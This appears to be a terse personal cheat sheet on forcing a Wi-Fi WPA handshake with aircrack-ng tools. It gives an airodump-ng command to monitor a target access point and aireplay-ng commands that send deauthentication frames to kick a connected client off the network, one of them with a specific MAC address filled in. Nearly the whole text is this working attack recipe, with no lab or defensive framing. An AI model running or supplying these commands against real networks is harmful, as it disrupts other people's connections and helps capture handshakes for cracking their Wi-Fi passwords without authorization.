force handshake via deauth attack
airodump-ng -c channel --bssid MAC   #monitor network
Once you see two MAC addresses appear next to each other 
(and a string of text that includes a manufacturer name next to them), you can proceed.
This indicates that a client (e.g., a computer) is now connected to the network.
open new terminal windows
aireplay-ng -0 2 -a MAC1 -c MAC2 wlan1mon   #send deauth package
maybe simple way: aireplay-ng -0 10 -a 80:35:C1:13:C1:2C wlan0mon
